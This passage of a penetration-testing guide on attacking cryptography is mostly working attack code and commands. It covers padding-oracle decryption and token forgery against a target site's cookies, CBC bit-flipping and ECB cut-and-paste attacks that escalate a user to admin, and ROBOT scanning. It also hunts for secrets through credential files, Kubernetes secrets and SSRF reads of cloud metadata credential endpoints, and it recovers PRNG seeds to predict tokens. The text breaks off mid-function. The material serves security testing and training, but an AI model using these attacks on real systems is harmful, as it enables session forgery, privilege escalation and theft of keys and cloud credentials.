        print(f"[*] Decrypting byte {BLOCK_SIZE - pad_value + 1}/{BLOCK_SIZE}")
        
        for byte_val in range(256):
            # Create test IV
            test_iv = bytearray(BLOCK_SIZE)
            
            # Set known bytes to produce valid padding
            for i in range(1, pad_value):
                pos = BLOCK_SIZE - i
                test_iv[pos] = intermediate[pos] ^ pad_value
            
            # Test current byte
            test_iv[BLOCK_SIZE - pad_value] = byte_val
            
            # Query oracle
            test_data = bytes(test_iv) + ciphertext_block
            if padding_oracle(test_data):
                # Found valid padding
                intermediate[BLOCK_SIZE - pad_value] = byte_val ^ pad_value
                plaintext[BLOCK_SIZE - pad_value] = intermediate[BLOCK_SIZE - pad_value] ^ iv_block[BLOCK_SIZE - pad_value]
                print(f"[+] Byte {BLOCK_SIZE - pad_value}: {hex(plaintext[BLOCK_SIZE - pad_value])}")
                break
        else:
            print(f"[-] Failed to find valid byte")
            return None
    
    return bytes(plaintext)

def decrypt_cbc(ciphertext):
    """Decrypt entire CBC ciphertext"""
    blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
    
    if len(blocks) < 2:
        print("[-] Need at least IV + 1 ciphertext block")
        return None
    
    plaintext = b""
    iv = blocks[0]
    
    for i in range(1, len(blocks)):
        print(f"\n[*] Decrypting block {i}/{len(blocks)-1}")
        decrypted = decrypt_block(blocks[i], iv)
        if decrypted:
            plaintext += decrypted
            iv = blocks[i]  # Previous ciphertext becomes IV
        else:
            print(f"[-] Failed to decrypt block {i}")
            break
    
    return plaintext

def encrypt_plaintext(plaintext, oracle_ciphertext):
    """Forge ciphertext for arbitrary plaintext"""
    # Add PKCS#7 padding
    pad_length = BLOCK_SIZE - (len(plaintext) % BLOCK_SIZE)
    plaintext += bytes([pad_length] * pad_length)
    
    blocks = [plaintext[i:i+BLOCK_SIZE] for i in range(0, len(plaintext), BLOCK_SIZE)]
    ciphertext = b""
    prev_block = b"\x00" * BLOCK_SIZE
    
    for block in reversed(blocks):
        # Calculate intermediate state
        intermediate = bytearray(BLOCK_SIZE)
        for pad_val in range(1, BLOCK_SIZE + 1):
            for byte_val in range(256):
                test_iv = bytearray(BLOCK_SIZE)
                for i in range(1, pad_val):
                    test_iv[BLOCK_SIZE - i] = intermediate[BLOCK_SIZE - i] ^ pad_val
                test_iv[BLOCK_SIZE - pad_val] = byte_val
                
                if padding_oracle(bytes(test_iv) + oracle_ciphertext):
                    intermediate[BLOCK_SIZE - pad_val] = byte_val ^ pad_val
                    break
        
        # Generate IV that produces desired plaintext
        iv = bytes([intermediate[i] ^ block[i] for i in range(BLOCK_SIZE)])
        ciphertext = iv + ciphertext
        oracle_ciphertext = bytes(iv)
    
    return ciphertext

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <base64_ciphertext>")
        sys.exit(1)
    
    ciphertext = b64decode(sys.argv[1])
    print(f"[*] Ciphertext length: {len(ciphertext)} bytes")
    print(f"[*] Block size: {BLOCK_SIZE}")
    
    plaintext = decrypt_cbc(ciphertext)
    if plaintext:
        print(f"\n[+] Decrypted plaintext: {plaintext}")
        print(f"[+] ASCII: {plaintext.decode('utf-8', errors='replace')}")
```

**Python paddingoracle Library:**

```bash
pip3 install python-paddingoracle

# Implementation
python3 << 'EOF'
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests

class PadBuster(PaddingOracle):
    def __init__(self, url, cookie_name):
        self.url = url
        self.cookie_name = cookie_name
    
    def oracle(self, data, **kwargs):
        """Define padding oracle behavior"""
        cookies = {self.cookie_name: b64encode(data).decode()}
        
        try:
            response = requests.get(
                self.url, 
                cookies=cookies,
                timeout=5,
                allow_redirects=False
            )
            
            # Customize detection logic
            if response.status_code == 500:
                raise BadPaddingException
            if 'padding' in response.text.lower():
                raise BadPaddingException
                
        except requests.RequestException:
            raise BadPaddingException

# Decrypt
oracle = PadBuster('http://target.com/view', 'auth')
ciphertext = b64decode('u7bvLewln6PJPSAbMb5qJw==')
plaintext = oracle.decrypt(ciphertext, block_size=16, iv=bytearray(16))
print(f"Decrypted: {plaintext}")

# Encrypt
new_plaintext = b"user=admin"
forged_ciphertext = oracle.encrypt(new_plaintext, block_size=16, iv=bytearray(16))
print(f"Forged token: {b64encode(forged_ciphertext).decode()}")
EOF
```

**Padding Oracle Exploitation Tips:**

Detection strategies when error messages are identical:

1. Response timing differences (valid padding faster)
2. Response size variations
3. Different redirect behavior
4. Subtle changes in headers
5. Application log analysis if accessible

**Automated Scanning:**

```bash
# Burp Suite Padding Oracle Scanner extension
# Install via Extender -> BApp Store

# Or use padbuster-ng
git clone https://github.com/GDSSecurity/PadBuster-ng
cd PadBuster-ng
python3 padbuster-ng.py --url http://target.com/decrypt \
  --cipher "encrypted_value" \
  --block-size 16 \
  --detect

# POET (Padding Oracle Exploit Tool)
pip3 install poet
poet --url "http://target.com" \
  --cookie "session" \
  --method GET \
  --decrypt "base64_ciphertext"
```

### Bleichenbacher Attack (ROBOT)

The Bleichenbacher attack exploits RSA PKCS#1 v1.5 padding in SSL/TLS implementations. A padding oracle in RSA decryption allows attackers to decrypt intercepted TLS sessions or forge signatures.

**Vulnerability Testing:**

```bash
# ROBOT vulnerability scanner
git clone https://github.com/robotattackorg/robot-detect
cd robot-detect
python3 robot-detect.py target.com 443

# Output interpretation:
# "vulnerable" - Exploitable
# "weak" - Partially vulnerable
# "not vulnerable" - Safe

# Batch scanning
while read -r host; do
  echo "Testing $host"
  python3 robot-detect.py "$host" 443 >> results.txt
done < targets.txt

# Alternative: testssl.sh checks for ROBOT
git clone https://github.com/drwetter/testssl.sh
./testssl.sh --vulnerable https://target.com
# Look for "ROBOT" in output

# Nmap NSE script
nmap --script ssl-enum-ciphers,ssl-known-key -p 443 target.com
```

**Exploitation (CVE-2017-6168, CVE-2017-17382, CVE-2017-17428):**

[Inference] Practical exploitation requires significant computational resources and is primarily performed in research contexts. Tools demonstrating the attack:

```bash
# Bleichenbacher proof-of-concept
git clone https://github.com/robotattackorg/bb-exploit
cd bb-exploit

# Requires captured TLS session
# Decrypt pre-master secret from session
python3 bleichenbacher.py --host target.com \
  --port 443 \
  --encrypted-pms encrypted_premaster.bin \
  --oracle-type conformant

# Number of oracle queries required: ~40,000-1,000,000 depending on implementation
```

### Chosen Ciphertext Attacks

**CBC Bit-Flipping Attack:**

CBC mode allows controlled plaintext modification by flipping bits in the previous ciphertext block.

```python
#!/usr/bin/env python3
from base64 import b64encode, b64decode

def xor_bytes(ba1, ba2):
    return bytes([b1 ^ b2 for b1, b2 in zip(ba1, ba2)])

def cbc_bitflip(ciphertext, block_size, target_block_num, original_plaintext, desired_plaintext):
    """
    Modify ciphertext to change plaintext of target_block_num
    
    Args:
        ciphertext: Original ciphertext (bytes)
        block_size: Block size (16 for AES)
        target_block_num: Block number to modify (1-indexed)
        original_plaintext: Known plaintext of target block
        desired_plaintext: Desired plaintext for target block
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    # Calculate bit-flip for IV or previous ciphertext block
    modify_block_idx = target_block_num - 1  # 0-indexed
    if modify_block_idx < 0:
        print("[-] Cannot modify IV (block 0)")
        return None
    
    # XOR calculation: C'[i-1] = C[i-1] XOR P[i] XOR P'[i]
    original = original_plaintext.ljust(block_size, b'\x00')[:block_size]
    desired = desired_plaintext.ljust(block_size, b'\x00')[:block_size]
    
    flip_pattern = xor_bytes(original, desired)
    modified_block = xor_bytes(blocks[modify_block_idx], flip_pattern)
    
    # Reconstruct ciphertext
    blocks[modify_block_idx] = modified_block
    return b''.join(blocks)

# Example: Modify "user=guest" to "user=admin"
ciphertext = b64decode("base64_encrypted_data_here")
BLOCK_SIZE = 16

# Assuming block 2 contains "user=guest\x06\x06\x06\x06\x06\x06"
original = b"user=guest\x06\x06\x06\x06\x06\x06"
desired = b"user=admin\x06\x06\x06\x06\x06\x06"

modified_ct = cbc_bitflip(ciphertext, BLOCK_SIZE, 2, original, desired)
if modified_ct:
    print(f"Modified ciphertext: {b64encode(modified_ct).decode()}")
    print("[*] Note: Block 1 plaintext will be corrupted")
```

**Practical CBC Bit-Flipping Scenario:**

```python
#!/usr/bin/env python3
import requests
from base64 import b64encode, b64decode

TARGET = "http://target.com"
BLOCK_SIZE = 16

def get_encrypted_cookie(username):
    """Get encrypted cookie for user"""
    r = requests.post(f"{TARGET}/register", data={'username': username})
    return r.cookies.get('session')

def xor_bytes(ba1, ba2):
    return bytes([b1 ^ b2 for b1, b2 in zip(ba1, ba2)])

# Step 1: Register with controlled username
# Server encrypts: "username=testuser&role=user"
session_cookie = get_encrypted_cookie('testuser')
ciphertext = b64decode(session_cookie)

# Step 2: Identify block structure
plaintext_structure = b"username=testuse"  # Block 1 (16 bytes)
                   # "r&role=user\x04\x04\x04\x04"  # Block 2

# Step 3: Flip bits to change role
# We control username, so we can position data precisely
# Register as: "X" * 8 (fills first block with predictable data)
session_cookie = get_encrypted_cookie('X' * 8)
ciphertext = b64decode(session_cookie)

# Blocks: [IV][username=XXXXXXXX][&role=user + pad]
# We'll flip block 1 to change "user" to "admin" in block 2

original_block2 = b"&role=user\x06\x06\x06\x06\x06\x06"
desired_block2 = b"&role=admin\x05\x05\x05\x05\x05"

blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
flip_pattern = xor_bytes(original_block2, desired_block2)
blocks[1] = xor_bytes(blocks[1], flip_pattern)

malicious_cookie = b64encode(b''.join(blocks)).decode()

# Step 4: Use modified cookie
r = requests.get(f"{TARGET}/admin", cookies={'session': malicious_cookie})
print(r.text)
```

### ECB Detection and Exploitation

ECB (Electronic Codebook) mode encrypts identical plaintext blocks to identical ciphertext blocks, leaking patterns.

**ECB Detection:**

```python
#!/usr/bin/env python3
from base64 import b64decode
from collections import Counter

def detect_ecb(ciphertext, block_size=16):
    """Detect ECB mode by finding repeated ciphertext blocks"""
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    unique_blocks = len(set(blocks))
    total_blocks = len(blocks)
    
    if unique_blocks < total_blocks:
        repeated = total_blocks - unique_blocks
        print(f"[+] ECB detected: {repeated} repeated blocks")
        
        # Show repeated blocks
        block_counts = Counter(blocks)
        for block, count in block_counts.items():
            if count > 1:
                print(f"    Block {block.hex()[:16]}... repeated {count} times")
        return True
    
    print(f"[-] No repeated blocks detected")
    return False

# Test
ciphertext = b64decode("encrypted_data")
detect_ecb(ciphertext)
```

**ECB Byte-at-a-Time Attack:**

When server encrypts attacker-controlled input plus unknown secret using ECB:

```python
#!/usr/bin/env python3
import requests
from base64 import b64decode

URL = "http://target.com/encrypt"
BLOCK_SIZE = 16

def encrypt_data(payload):
    """Submit payload to encryption oracle"""
    r = requests.post(URL, data={'input': payload})
    return b64decode(r.text.strip())

def detect_block_size():
    """Determine block size by observing ciphertext length changes"""
    initial_len = len(encrypt_data(''))
    for i in range(1, 64):
        ct_len = len(encrypt_data('A' * i))
        if ct_len > initial_len:
            return ct_len - initial_len
    return None

def ecb_decrypt_byte(known_plaintext, block_num=0):
    """Decrypt one byte using ECB oracle"""
    # Create payload that shifts secret by one byte
    prefix_len = BLOCK_SIZE - (len(known_plaintext) % BLOCK_SIZE) - 1
    prefix = 'A' * prefix_len
    
    # Get ciphertext for comparison
    target_ct = encrypt_data(prefix)
    target_block = target_ct[block_num*BLOCK_SIZE:(block_num+1)*BLOCK_SIZE]
    
    # Brute force the next byte
    for byte_val in range(256):
        test_input = prefix + known_plaintext + chr(byte_val)
        test_ct = encrypt_data(test_input)
        test_block = test_ct[block_num*BLOCK_SIZE:(block_num+1)*BLOCK_SIZE]
        
        if test_block == target_block:
            return chr(byte_val)
    
    return None

def ecb_decrypt_secret():
    """Decrypt entire secret appended by server"""
    secret = ""
    
    # Determine secret length
    base_len = len(encrypt_data(''))
    secret_len = base_len  # Approximate
    
    for i in range(secret_len):
        byte = ecb_decrypt_byte(secret, i // BLOCK_SIZE)
        if byte:
            secret += byte
            print(f"[+] Recovered: {secret}")
        else:
            break
    
    return secret

if __name__ == "__main__":
    block_size = detect_block_size()
    print(f"[*] Block size: {block_size}")
    
    BLOCK_SIZE = block_size
    secret = ecb_decrypt_secret()
    print(f"\n[+] Final secret: {secret}")
```

**ECB Cut-and-Paste Attack:**

```python
#!/usr/bin/env python3
from base64 import b64encode, b64decode

def ecb_cut_paste(oracle_func, block_size=16):
    """
    Exploit ECB to create desired plaintext
    Assumes: encryption of "email=USER_INPUT&role=user"
    Goal: Create "email=attacker@x.com&role=admin"
    """
    
    # Step 1: Craft email that puts "admin" at block boundary
    # "email=" is 6 bytes
    # Pad with 10 'X' to reach 16 bytes: "email=XXXXXXXXXX"
    # Next block: "admin\x0b\x0b\x0b..." (admin with PKCS#7 padding)
    
    email1 = "X" * 10 + "admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b"
    ct1 = oracle_func(email1)
    admin_block = ct1[block_size:block_size*2]  # Extract "admin" block
    
    # Step 2: Create email that results in "email=attacker@x.com&role="
    # Must be exactly N*block_size before "user"
    email2 = "attacker@x.com"  # Adjust length to align
    ct2 = oracle_func(email2)
    
    # Step 3: Replace final block with admin_block
    blocks = [ct2[i:i+block_size] for i in range(0, len(ct2), block_size)]
    blocks[-1] = admin_block
    
    forged_ct = b''.join(blocks)
    return b64encode(forged_ct).decode()

# Example usage
def encryption_oracle(email):
    """Simulated server-side encryption"""
    plaintext = f"email={email}&role=user"
    # ... ECB encryption happens here ...
    return encrypted_ciphertext

malicious_token = ecb_cut_paste(encryption_oracle)
print(f"Forged token: {malicious_token}")
```

## Weak Key Management

### Hard-Coded Cryptographic Keys

**Source Code Analysis:**

```bash
# Grep patterns for hardcoded keys
grep -r -E "(secret|key|password|token|api_key|private_key|SECRET_KEY)\s*=\s*['\"]" /path/to/code/

# Find base64-encoded keys (typically 16/24/32 bytes = 22/32/44 base64 chars)
grep -r -E "['\"][A-Za-z0-9+/]{20,}={0,2}['\"]" /path/to/code/ | grep -i "key\|secret"

# Find hex-encoded keys
grep -r -E "0x[0-9a-fA-F]{32,}|['\"][0-9a-fA-F]{32,}['\"]" /path/to/code/

# RSA/SSH private keys
grep -r "BEGIN.*PRIVATE KEY\|BEGIN RSA\|BEGIN OPENSSH" /path/to/code/

# JWT secrets
grep -r "jwt.*secret\|JWT_SECRET\|jwtSecret" /path/to/code/ -i

# AWS keys (pattern: AKIA followed by 16 alphanumeric)
grep -r -E "AKIA[0-9A-Z]{16}" /path/to/code/

# Generic secret patterns
grep -r -E "(api_key|apikey|api-key|access_key|auth_token|secret_token)" /path/to/code/ -i
```

**Git Repository Analysis:**

```bash
# Search git history for secrets
git log -p | grep -E "password|secret|key" -i

# TruffleHog - automated secret scanning
pip3 install truffleHog
trufflehog --regex --entropy=True https://github.com/target/repo

# GitLeaks - comprehensive secret detection
git clone https://github.com/gitleaks/gitleaks
cd gitleaks
./gitleaks detect --source /path/to/repo --verbose

# Gitleaks with custom rules
./gitleaks detect --source /path/to/repo \
  --config gitleaks.toml \
  --report-path report.json

# GitRob - GitHub organization reconnaissance
git clone https://github.com/michenriksen/gitrob
cd gitrob
./gitrob -t <GITHUB_TOKEN> targetorg

# Search GitHub directly
# Use GitHub API or web interface:
# "org:targetname password"
# "org:targetname api_key"
# "org:targetname BEGIN RSA PRIVATE KEY"
```

**Binary Analysis:**

```bash
# Extract strings from compiled binary
strings binary_file | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" > potential_keys.txt

strings binary_file | grep -i -E "key|secret|password|token|crypto"

# Extract with character encoding detection
strings -a -t x binary_file  # All strings with hex offset
strings -e l binary_file     # 16-bit littleendian
strings -e b binary_file     # 16-bit bigendian

# rabin2 from radare2 toolkit
rabin2 -z binary_file        # Extract strings
rabin2 -zz binary_file       # Extract all strings (including data sections)
rabin2 -I binary_file        # Binary info

# Search data sections specifically
objdump -s -j .rodata binary_file | grep -E "[0-9a-f]{32,}"

# Automated analysis with radare2
r2 -A binary_file
# Inside r2:
# iz        - List strings in data sections
# izz       - List all strings
# / secret  - Search for "secret"
# /x 414B494132  - Search hex pattern (AKIA2...)

# Ghidra analysis for embedded keys
# Open binary in Ghidra
# Window -> Defined Strings
# Search -> For Strings -> Min length 16
# Look for base64 patterns: [A-Za-z0-9+/]+=*

# Extract .NET assemblies
dnspy Assembly.dll           # Decompile and search
ilspy Assembly.dll           # Alternative decompiler

# Java JAR files
unzip application.jar -d extracted/
grep -r "secret\|key" extracted/
jd-gui application.jar       # Decompile with JD-GUI
```

**Configuration File Discovery:**

```bash
# Common configuration file locations
find /var/www -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.yaml"
find /etc -name "*.conf" 2>/dev/null

# WordPress configuration
cat /var/www/html/wp-config.php | grep -E "DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY"

# Laravel .env files
find /var/www -name ".env" -exec cat {} \; 2>/dev/null

# Django settings
find /var/www -name "settings.py" -exec grep -H "SECRET_KEY" {} \;

# Node.js configuration
find /var/www -name ".env" -o -name "config.js" -o -name "config.json"
cat package.json | grep -E "config|scripts"

# Ruby on Rails
find /var/www -name "secrets.yml" -o -name "database.yml"
cat config/master.key       # Rails 5.2+ encrypted credentials key

# Container configurations
cat /.dockerenv 2>/dev/null
cat /run/secrets/* 2>/dev/null
env | grep -E "SECRET|KEY|PASSWORD|TOKEN"

# Kubernetes secrets (if accessible)
kubectl get secrets -A
kubectl get secret secret-name -o yaml
```

**Web Application Discovery:**

```bash
# JavaScript source maps (may reveal source code)
curl https://target.com/static/js/main.js.map

# Webpack bundles
wget https://target.com/static/js/bundle.js
js-beautify bundle.js > bundle.readable.js
grep -E "secret|key|api" bundle.readable.js -i

# Browser DevTools - Search all sources
# Chrome: Ctrl+Shift+F -> Search for "secret", "key", "password"

# robots.txt and sitemap discovery
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# Common exposed files
curl https://target.com/.git/config
curl https://target.com/.env
curl https://target.com/config.json
curl https://target.com/.aws/credentials
curl https://target.com/id_rsa

# Directory fuzzing for configuration files
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://target.com/FUZZ \
  -mc 200 \
  -e .env,.config,.ini,.yaml,.yml,.json,.xml,.conf,.properties

# GitLab CI variables exposure (misconfiguration)
curl https://target.com/.gitlab-ci.yml
```

**Docker and Container Secrets:**

```bash
# Docker inspect for secrets
docker inspect container_id | grep -i "env\|secret"

# Environment variables in running containers
docker exec container_id env

# Docker secrets (Swarm mode)
docker secret ls
docker secret inspect secret_name

# Container filesystem inspection
docker export container_id > container.tar
tar -xf container.tar
grep -r "secret\|key" . -i

# Kubernetes secrets extraction
kubectl get secrets --all-namespaces
kubectl get secret secret-name -o json | jq '.data | map_values(@base64d)'

# Read secret from pod
kubectl exec -it pod-name -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Database Credential Extraction:**

```bash
# MySQL configuration files
cat /etc/mysql/my.cnf
cat ~/.my.cnf

# PostgreSQL
cat ~/.pgpass
cat /var/lib/postgresql/data/postgresql.conf

# MongoDB
cat /etc/mongod.conf

# Redis (often no password)
redis-cli -h target.com INFO server

# Connection strings in code
grep -r "mysql://\|postgres://\|mongodb://\|redis://" /var/www/
grep -r "Server=.*Password=" /var/www/  # MSSQL connection strings
```

### Cloud Provider Credentials

**AWS Credentials:**

```bash
# AWS credentials file
cat ~/.aws/credentials
cat ~/.aws/config

# Instance metadata service (SSRF exploitation)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# AWS access key format validation
# Access Key: AKIA[0-9A-Z]{16}
# Secret Key: [A-Za-z0-9/+=]{40}

# Test AWS credentials
aws sts get-caller-identity --profile found_creds

# Enumerate AWS permissions
git clone https://github.com/andresriancho/enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# S3 bucket enumeration with found keys
aws s3 ls --profile found_creds
aws s3 ls s3://bucket-name --recursive
```

**Azure Credentials:**

```bash
# Azure metadata service
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure CLI credentials
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Service principal credentials in environment
env | grep AZURE

# Test Azure credentials
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID
az account list
```

**GCP Credentials:**

```bash
# GCP metadata service
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/project/project-id

# GCP service account keys
cat ~/.config/gcloud/application_default_credentials.json
find / -name "*gcp*.json" 2>/dev/null

# Test GCP credentials
gcloud auth activate-service-account --key-file=credentials.json
gcloud projects list
```

### Weak Random Number Generation

**Predictable Token Analysis:**

```python
#!/usr/bin/env python3
import requests
import re
from collections import Counter
import math

TARGET_URL = "https://target.com/api/generate_token"
SAMPLES = 1000

def collect_tokens(num_samples):
    """Collect multiple tokens from target"""
    tokens = []
    for i in range(num_samples):
        try:
            r = requests.get(TARGET_URL, timeout=5)
            token = r.json().get('token')
            if token:
                tokens.append(token)
                if i % 100 == 0:
                    print(f"[*] Collected {i}/{num_samples}")
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    return tokens

def analyze_entropy(tokens):
    """Calculate Shannon entropy of token set"""
    if not tokens:
        return 0
    
    # Convert tokens to bytes
    all_bytes = []
    for token in tokens:
        try:
            # Decode if hex or base64
            if re.match(r'^[0-9a-fA-F]+$', token):
                all_bytes.extend(bytes.fromhex(token))
            else:
                all_bytes.extend(token.encode())
        except:
            continue
    
    if not all_bytes:
        return 0
    
    # Calculate byte frequency
    byte_counts = Counter(all_bytes)
    entropy = 0
    for count in byte_counts.values():
        probability = count / len(all_bytes)
        entropy -= probability * math.log2(probability)
    
    return entropy

def check_patterns(tokens):
    """Check for common patterns in tokens"""
    print("\n[*] Pattern Analysis:")
    
    # Uniqueness
    unique_ratio = len(set(tokens)) / len(tokens)
    print(f"    Uniqueness: {unique_ratio:.2%} ({len(set(tokens))}/{len(tokens)})")
    
    # Duplicates
    duplicates = [t for t, count in Counter(tokens).items() if count > 1]
    if duplicates:
        print(f"    [!] Found {len(duplicates)} duplicate tokens")
        for dup in duplicates[:5]:
            print(f"        {dup}")
    
    # Sequential patterns
    if all(re.match(r'^[0-9a-fA-F]+$', t) for t in tokens[:10]):
        int_tokens = [int(t, 16) for t in tokens if re.match(r'^[0-9a-fA-F]+$', t)]
        differences = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
        
        if len(set(differences)) < len(differences) * 0.1:  # <10% unique differences
            print(f"    [!] Sequential pattern detected")
            print(f"        Common difference: {Counter(differences).most_common(1)[0][0]}")
    
    # Timestamp correlation
    try:
        import time
        current_time = int(time.time())
        for token in tokens[:10]:
            if re.match(r'^[0-9]+$', token):
                token_int = int(token)
                if abs(token_int - current_time) < 86400:  # Within 24 hours
                    print(f"    [!] Token may be timestamp-based: {token}")
    except:
        pass
    
    # Length consistency
    lengths = [len(t) for t in tokens]
    if len(set(lengths)) == 1:
        print(f"    Fixed length: {lengths[0]} characters")
    else:
        print(f"    Variable length: {min(lengths)}-{max(lengths)} characters")

def test_predictability(tokens):
    """Test if tokens follow predictable patterns"""
    print("\n[*] Predictability Tests:")
    
    # Try to predict next token based on previous ones
    if len(tokens) >= 3:
        # Check if tokens are sequential numbers
        try:
            if all(re.match(r'^[0-9]+$', t) for t in tokens[:3]):
                nums = [int(t) for t in tokens[:3]]
                if nums[1] - nums[0] == nums[2] - nums[1]:
                    predicted = nums[-1] + (nums[1] - nums[0])
                    print(f"    [!] Predicted next token: {predicted}")
        except:
            pass

if __name__ == "__main__":
    print(f"[*] Collecting {SAMPLES} tokens from {TARGET_URL}")
    tokens = collect_tokens(SAMPLES)
    
    if not tokens:
        print("[-] No tokens collected")
        exit(1)
    
    print(f"\n[+] Collected {len(tokens)} tokens")
    
    # Entropy analysis
    entropy = analyze_entropy(tokens)
    print(f"\n[*] Entropy: {entropy:.2f} bits/byte")
    if entropy < 7.0:
        print(f"    [!] LOW ENTROPY - Weak randomness detected")
    
    # Pattern analysis
    check_patterns(tokens)
    
    # Predictability test
    test_predictability(tokens)
```

**PHP mt_rand() Seed Recovery:**

```bash
# PHP mt_rand uses Mersenne Twister with recoverable state
# Given consecutive outputs, seed can be determined

# Install php_mt_seed
wget https://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-4.0.tar.gz
tar xzf php_mt_seed-4.0.tar.gz
cd php_mt_seed-4.0
make

# Recover seed from single output
./php_mt_seed <observed_value>

# If multiple outputs available (more reliable)
./php_mt_seed <value1> <value2> <value3>

# Example: Token uses mt_rand(1000000, 9999999)
./php_mt_seed 1234567 0 9999999 8901234 0 9999999

# Once seed recovered, predict future values
php -r "mt_srand(RECOVERED_SEED); echo mt_rand(1000000, 9999999);"
```

**PHP Untwister - Advanced MT Seed Recovery:**

```bash
# Untwister for complex scenarios
pip3 install untwister

# Python interface
python3 << 'EOF'
from untwister import Untwister

# Submit observed mt_rand outputs
ut = Untwister()
ut.submit(1234567)  # First observed value
ut.submit(8901234)  # Second observed value
ut.submit(5678901)  # Third observed value (more = better)

# Attempt seed recovery
seed = ut.get_seed()
if seed:
    print(f"[+] Recovered seed: {seed}")
    
    # Predict future values
    ut.set_seed(seed)
    for i in range(10):
        print(f"    Next value: {ut.get_random()}")
else:
    print("[-] Could not recover seed")
EOF
```

**Java Random() Exploitation:**

```python
#!/usr/bin/env python3
# Java's Random uses Linear Congruential Generator (LCG)
# Formula: next = (multiplier * seed + addend) mod modulus
# Parameters: multiplier=0x5DEECE66D, addend=0xB, modulus=2^48

MULTIPLIER = 0x5DEECE66D
ADDEND = 0xB
MODULUS = 2**48
MASK = (1 << 48) - 1

def reverse_java_random_seed(observed_outputs):
    """
    Recover Java Random seed from consecutive outputs
    Requires 2 consecutive calls to nextInt()
    """
    if len(observed_outputs) < 2:
        print("[-] Need at least 2 consecutive outputs")
        return None
    
    # Java nextInt() uses upper 32 bits of next(32)
    # We need to brute force lower 16 bits
    
    output1 = observed_outputs[0]
    output2 = observed_outputs[1]
    
    for lower_bits in range(1 << 16):
        # Reconstruct first internal state
        state1 = (output1 << 16) | lower_bits
        
        # Calculate next state
        state2 = ((state1 * MULTIPLIER + ADDEND) & MASK)
        
        # Check if upper 32 bits match second output
        if (state2 >> 16) == output2:
            # Found valid state, calculate seed
            seed = ((state1 - ADDEND) * pow(MULTIPLIER, -1, MODULUS)) & MASK
            return seed ^ MULTIPLIER  # XOR to get original seed
    
    return None

def predict_java_random(seed, count=10):
    """Generate next values from recovered seed"""
    state = (seed ^ MULTIPLIER) & MASK
    results = []
    
    for _ in range(count):
        state = ((state * MULTIPLIER + ADDEND) & MASK)
        result = state >> 16  # Upper 32 bits
        results.append(result & 0xFFFFFFFF)  # Mask to 32-bit unsigned
    
    return results

# Example usage
observed = [1234567890, 987654321]  # Two consecutive nextInt() outputs
seed = reverse_java_random_seed(observed)

if seed:
    print(f"[+] Recovered seed: {seed}")
    print(f"[+] Predicted next values:")
    for val in predict_java_random(seed, 10):
        print(f"    {val}")
else:
    print("[-] Could not recover seed")
```

**Python random Module State Recovery:**

```python
#!/usr/bin/env python3
import random

# Python's random uses Mersenne Twister (MT19937)
# State can be cloned with getstate() if accessible
# Or recovered from 624 consecutive 32-bit outputs

def recover_mt19937_state(outputs):
    """
    Recover MT19937 state from 624 consecutive outputs
    Each output reveals internal state through tempering
    """
    if len(outputs) < 624:
        print("[-] Need 624 consecutive outputs to recover state")
        return None
    
    # Untemper each output
    def untemper(y):
        # Reverse tempering operations
        y ^= y >> 18
        y ^= (y << 15) & 0xEFC60000
        
        # This requires 7 iterations
        for _ in range(7):
            y ^= (y << 7) & 0x9D2C5680
        
        # This requires 3 iterations  
        for _ in range(3):
            y ^= y >> 11
        
        return y
    
    # Recover internal state
    mt_state = tuple([untemper(o) for o in outputs[:624]])
    
    return mt_state

def clone_random_generator(outputs):
    """Create Python random generator with recovered state"""
    state = recover_mt19937_state(outputs)
    if not state:
        return None
    
    # Create new generator with recovered state
    rng = random.Random()
    rng.setstate((3, state + (624,), None))
    
    return rng

# Example: Predict future values
# (In real scenario, collect 624 outputs from target)
observed_outputs = [random.getrandbits(32) for _ in range(624)]

cloned_rng = clone_random_generator(observed_outputs)
if cloned_rng:
    print("[+] Successfully cloned random state")
    print("[+] Next 10 predictions:")
    for _ in range(10):
        print(f"    {cloned_rng.random()}")
```

**Time-Based Seed Prediction:**

```python
#!/usr/bin/env python3
import time
import random
import hashlib

def brute_force_time_seed(target_value, value_generator, time_window=3600):
    """
    Brute force time-based seed
    
    Args:
        target_value: Known generated value
        value_generator: Function that generates value from seed
        time_window: Seconds to search before/after current time
    """
    current_time = int(time.time())
    
    for offset in range(-time_window, time_window):
        seed = current_time + offset
        
        # Test seed
        if value_generator(seed) == target_value:
            print(f"[+] Found seed: {seed}")
            print(f"    Timestamp: {time.ctime(seed)}")
            return seed
    
    print("[-] Seed not found in time window")
    return None

# Example: PHP uniqid() uses microtime
def predict_uniqid(prefix="", more_entropy=False):
    """
    PHP uniqid() format: prefix + hex(microtime)
    Predictable if timestamp known
    """
    import time
    
    # uniqid uses microseconds since epoch
    microseconds = int(time.time() * 1000000)
    
    # Convert to hex (uniqid format)
    uniqid_value = f"{prefix}{microseconds:x}"
    
    if more_entropy:
        # Adds .XXXXXXXX where X is from LCG
